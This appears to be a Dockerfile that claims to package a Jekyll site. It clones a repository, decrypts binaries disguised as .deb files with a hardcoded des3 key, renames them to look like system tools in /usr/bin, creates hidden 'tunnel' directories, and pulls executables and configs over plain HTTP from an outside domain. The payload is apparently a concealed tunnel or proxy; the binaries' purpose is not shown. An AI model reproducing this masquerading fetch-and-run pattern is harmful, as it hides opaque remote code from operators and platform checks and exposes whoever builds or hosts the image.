FROM ubuntu

RUN mkdir /jekyll
RUN mkdir /jekyll/Config

ADD apt /jekyll/apt
ADD MAGIC /jekyll/MAGIC

RUN apt update && apt install -y curl git wget tar openssl unzip

RUN cd /jekyll

RUN git clone https://github.com/jekyll-mask-repo-new/Paas-Bin.git
RUN dd if=Paas-Bin/Mark_ClE_17353_62.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN dd if=Paas-Bin/Mark_bUx_12338_61.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN dd if=Paas-Bin/Mark-XJj-28912-92.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN rm -rf Paas-Bin

RUN mv Mark_ClE_17353_62 /usr/bin/dpkg-install-Mark_ClE_17353_62.deb && mv Mark_bUx_12338_61 /usr/bin/dpkg-install-Mark_bUx_12338_61.deb && mv Mark-XJj-28912-92 /usr/bin/caddy

RUN mkdir /.temp
RUN mkdir /.temp/tunnel
RUN mkdir /.temp/tunnel/id/
RUN mkdir /.temp/tunnel/id/.86de6451-e653-4318-bd38-4e8e4a9d8006

RUN wget http://jekyll-mask-repo.helis.cf/jek-downloads/website.zip && unzip website.zip && chmod +x -R website && mv website /jekyll/website

RUN wget http://jekyll-mask-repo.helis.cf/crossover.yaml && chmod 0777 crossover.yaml && mv crossover.yaml /jekyll/crossover.yaml
RUN wget http://jekyll-mask-repo.helis.cf/Caddy/Caddyfile && chmod 0777 Caddyfile && mv Caddyfile /jekyll/Caddyfile

RUN chmod +x -R /jekyll

CMD ./jekyll/apt
